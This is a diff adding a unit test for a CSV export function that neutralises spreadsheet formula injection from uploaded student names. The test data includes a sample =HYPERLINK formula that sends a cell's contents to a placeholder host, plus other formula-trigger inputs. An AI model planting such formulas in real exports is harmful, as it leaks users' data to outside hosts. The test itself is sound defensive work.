@@ -31,6 +31,24 @@ describe("toCsv", () => {
     expect(csv).toContain('="0155123456"');
   });
 
+  // A cell that starts with = + - @ (or a tab/CR) is a FORMULA to Excel. The
+  // student import echoes names straight from an uploaded spreadsheet, so
+  // =HYPERLINK("http://x/?"&B2) would run in the office's Excel. The apostrophe
+  // is Excel's "this is text" mark; plain signed numbers stay numbers.
+  it("neutralises a value Excel would run as a formula", () => {
+    const rows = ['=HYPERLINK("http://x/?"&B2,"ver")', "+1+1", "@SUM(A1)", "-2+3", "\tcmd", "-150.00", "+52 33"];
+    const csv = toCsv([{ label: "Nombre", value: (r: { v: string }) => r.v }], rows.map((v) => ({ v })));
+    const cells = csv.split("\r\n").slice(1);
+
+    expect(cells[0]).toBe(`"'=HYPERLINK(""http://x/?""&B2,""ver"")"`);
+    expect(cells[1]).toBe("'+1+1");
+    expect(cells[2]).toBe("'@SUM(A1)");
+    expect(cells[3]).toBe("'-2+3");
+    expect(cells[4]).toBe("'\tcmd");
+    expect(cells[5]).toBe("-150.00");
+    expect(cells[6]).toBe("'+52 33");
+  });
+
   it("writes CRLF line endings, which is what Excel expects", () => {
     const csv = toCsv([{ label: "A", value: () => "1" }], [{}, {}]);
 
